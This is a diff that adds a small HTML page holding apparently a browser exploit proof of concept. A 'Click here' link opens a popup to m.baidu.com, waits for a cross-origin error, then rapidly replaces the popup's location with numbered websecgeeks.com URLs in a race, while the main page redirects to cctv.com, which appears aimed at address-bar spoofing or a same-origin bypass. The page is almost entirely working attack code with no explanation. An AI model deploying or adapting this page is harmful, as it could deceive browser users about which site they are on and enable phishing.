@@ -1,0 +1,15 @@
+<html><head><script>
+function next()
+{
+    w.location.replace('http://websecgeeks.com/'+n);
+    n++;
+    setTimeout("next();", 25);
+    setTimeout("next();", 35);
+}
+function f()
+{
+    w = window.open("http://m.baidu.com/", "_blank", "width=500 height=500");
+    i = setInterval("try{x = w.location.href;} catch(e) { clearInterval(i); n = 0; next(); }", 5);
+}
+</script>
+</head><body><a href="#" onclick="f();setTimeout(function(){document.location='https://www.cctv.com/'}, 300)">Click here</a><br></body></html>
